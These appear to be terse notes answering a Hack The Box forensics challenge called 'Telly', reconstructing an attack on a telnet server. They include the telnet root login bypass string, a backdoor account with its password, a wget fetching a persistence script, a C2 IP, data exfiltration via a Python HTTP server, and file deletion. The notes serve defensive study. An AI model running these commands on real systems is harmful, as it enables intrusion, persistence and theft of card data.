HTB Telly

`.kali:0.0....'..USER.-f root.DISPLAY.kali`

telnet

CVE-2026-24081


attacker connected - 2026-01-27 10:39:28

`root@backup-secondary: ~.root@backup-secondary:~# `

Host - root@backup-secondary 


id


uid=0(root) gid=0(root) groups=0(root)


attacker add the user

`sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd`


username - cleanupsvc

password - YouKnowWhoiam69


`wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`


script - linper.sh

`bash linper.sh --enum-defenses`

C2 IP - 91.99.25.54


exfiltration at - 2026-01-27 10:49:54

`python -m http.server 6932`


db file - credit-cards-25-blackfriday.db

GET /credit-cards-25-blackfriday.db HTTP/1.1

`rm credit-cards-25-blackfriday.db`
